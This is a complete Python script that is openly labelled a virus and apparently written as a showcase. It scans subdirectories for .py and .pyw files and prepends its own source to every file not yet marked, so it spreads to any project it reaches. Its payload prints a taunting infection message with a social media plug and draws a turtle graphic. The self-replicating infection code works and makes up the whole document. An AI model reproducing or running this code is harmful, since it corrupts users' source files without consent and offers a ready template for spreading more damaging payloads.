# VIRUS SAYS HI!


# importing the required modules

import turtle
import os
import sys
import glob


# self replicating part

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break



# getting the details of the current directory and listing out the python files

current_dir = os.getcwd()
python_files = glob.glob(f'{current_dir}/**/*.py') + glob.glob(f'{current_dir}/**/*.pyw')




# affecting the python files
# adding the virus code to the existing code

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

# payload
# here just printing a message on the terminal and shows a turtle pattern

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")
    print("FOLLOW @python.portal FOR MORE AMAZING CONTENT!!!")

    
    squary = turtle.Turtle(visible = False)
    squary.color("#11B7D4")
    turtle.bgcolor("#111418")
    squary.speed(10)

    for i in range(500): # this "for" loop will repeat these functions 500 times
        squary.forward(i)
        squary.left(91)

malicious_code()

# VIRUS SAYS BYE!